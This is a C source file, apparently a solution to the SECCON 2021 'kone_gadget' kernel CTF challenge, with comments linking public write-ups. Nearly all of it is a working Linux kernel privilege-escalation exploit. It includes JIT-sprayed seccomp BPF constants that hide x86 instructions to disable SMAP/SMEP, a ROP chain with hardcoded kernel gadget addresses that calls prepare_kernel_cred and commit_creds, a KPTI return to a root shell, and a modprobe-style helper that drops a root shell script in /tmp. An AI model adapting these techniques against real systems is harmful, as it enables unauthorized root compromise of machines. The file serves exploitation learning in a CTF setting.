#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <linux/bpf.h>
#include "bpf_insn.h"
#include <sys/socket.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

#define DEV_PATH "/dev/bank"   // the path the device is placed

#define ulong unsigned long

#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

bool is_kernel_ptr(uint64_t val)
{
    return (val & 0xffffffff00000000) == 0xffffffff00000000
        && val != 0xffffffffffffffff;
}

/*
 * 2 bytes rop: <opcode> + jmp $+3
 * 3 bytes rop: <opcode> + add al, 0x08 = 0x04 + 0xb8 (mov)
 * - skip the mov by transferring it into an add al, 0xb8
 *
 *   0xffffffffc0000a07
 *
 *   0x8 per struct
 */
#define FILTER_LEN 0x1000
#define ADDR 0xffffffffc0015035
static int install_filter(void)
{
    struct sock_filter tmp[] = {
        BPF_STMT(BPF_LD+BPF_K, 0x01eb9090), // nop;nop;jmp $+3
        BPF_STMT(BPF_LD+BPF_K, 0x04e7200f), // mov rdi, cr4; and al, XX
        BPF_STMT(BPF_LD+BPF_K, 0x01ebc3ff), // inc ebx; jmp $+3
        // clear 20th bit of cr4 to clear SMAP 
        BPF_STMT(BPF_LD+BPF_K, 0x0415e3c1), // shl ebx, 21; and al, XX
        BPF_STMT(BPF_LD+BPF_K, 0x01ebdf31), // xor edi, ebx; jmp $+3
        BPF_STMT(BPF_LD+BPF_K, 0x04e7220f), // mov cr4, rdi; and al, XX
        BPF_STMT(BPF_LD+BPF_K, 0x01ebc4ff), // inc esp
        BPF_STMT(BPF_LD+BPF_K, 0x0410e4c1), // shl esp, 16, and al, XX
        BPF_STMT(BPF_LD+BPF_K, 0xc3909090), // ret
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)
    };

    struct sock_filter filter[FILTER_LEN] = {0};
    size_t tmp_sz = sizeof(tmp)/sizeof(tmp[0])-0x1;
    for (size_t i = 0; i < FILTER_LEN - tmp_sz; i++) {
        filter[i] = tmp[0x0];
    }
    for (size_t i = 0x0; i < tmp_sz; i++) {
        filter[FILTER_LEN-tmp_sz + i] = tmp[i+1];
    }

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
        .filter = filter
    };

    // mandatory
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        errExit("prctl(NO_NEW_PRIVS)");
	}

    /*
     EACCES option is PR_SET_SECCOMP and arg2 is SECCOMP_MODE_FILTER,
              but the process does not have the CAP_SYS_ADMIN capability
              or has not set the no_new_privs attribute (see the
              discussion of PR_SET_NO_NEW_PRIVS above).
    */
	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
        errExit("prctl");
	}

	return 0;
}

static int install_filter2(void)
{
    struct sock_filter tmp[] = {
        BPF_STMT(BPF_LD+BPF_K, 0x01eb9090), // nop;nop;jmp $+3
        BPF_STMT(BPF_LD+BPF_K, 0x04cb010f), // stac
        BPF_STMT(BPF_LD+BPF_K, 0x01ebc4ff), // inc esp
        BPF_STMT(BPF_LD+BPF_K, 0x0410e4c1), // shl esp, 16, and al, XX
        BPF_STMT(BPF_LD+BPF_K, 0xc3909090), // ret
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)
    };

    struct sock_filter filter[FILTER_LEN] = {0};
    size_t tmp_sz = sizeof(tmp)/sizeof(tmp[0])-0x1;
    for (size_t i = 0; i < FILTER_LEN - tmp_sz; i++) {
        filter[i] = tmp[0x0];
    }
    for (size_t i = 0x0; i < tmp_sz; i++) {
        filter[FILTER_LEN-tmp_sz + i] = tmp[i+1];
    }

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
        .filter = filter
    };

    // mandatory
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        errExit("prctl(NO_NEW_PRIVS)");
	}

    /*
     EACCES option is PR_SET_SECCOMP and arg2 is SECCOMP_MODE_FILTER,
              but the process does not have the CAP_SYS_ADMIN capability
              or has not set the no_new_privs attribute (see the
              discussion of PR_SET_NO_NEW_PRIVS above).
    */
	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
        errExit("prctl");
	}

	return 0;
}

#define SYS_SECCON 1337

// clear SMAP and SMEP bit in cr4 and return to rop chain
// clearing SMAP should be enough then just rop chain
int main(void) 
{
    install_filter2();

    puts("installed filter");

    uint64_t* stack = mmap((void*)0x10000, 0x2000, PROT_READ | PROT_WRITE, 
            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0x0);

    if (stack < 0) {
        errExit("mmap");
    }

    uint64_t commit_creds = 0xffffffff81073ad0;
    uint64_t prepare_kernel_cred = 0xffffffff81073c60;
    uint64_t kpti_tramp = 0xffffffff81800e10 + 22;
    uint64_t pop_rdi = 0xffffffff81138833;
    uint64_t pop_rbp = 0xffffffff81000599;
    uint64_t push_rax_leave_ret = 0xffffffff8140e6dc;
    uint64_t ret = 0xffffffff8100059a;

    for (int i = 0; i < 0x40; i++) {
        stack[i] = ret;
    }
    unsigned off = 0x40;
    stack[off++] = pop_rdi;
    stack[off++] = 0x0;
    stack[off++] = prepare_kernel_cred;
    stack[off++] = pop_rbp;
    stack[off++] = &stack[off + 0x1];
    stack[off++] = pop_rdi;
    stack[off++] = pop_rdi;
    stack[off++] = push_rax_leave_ret; 
    stack[off++] = commit_creds;

    stack[off++] = kpti_tramp; 
    stack[off++] = 0x0;
    stack[off++] = 0x0;
    save_state();
    printf("%p %p %p %p \n", user_cs, user_rflags, user_sp, user_ss);
    stack[off++] = (uint64_t)get_shell;
    stack[off++] = user_cs;
    stack[off++] = user_rflags;
    stack[off++] = user_sp;
    stack[off++] = user_ss;
    stack[off++] = 0xdeadbeef;

    syscall(SYS_SECCON, ADDR);

    WAIT();

    return 0;
}

// https://balsn.tw/ctf_writeup/20211211-secconctf2021/#kone_gadget
// https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Pwnable-365pts-kone_gadget
// https://smallkirby.hatenablog.com/entry/2021/12/12/211601
//
// READ: https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/
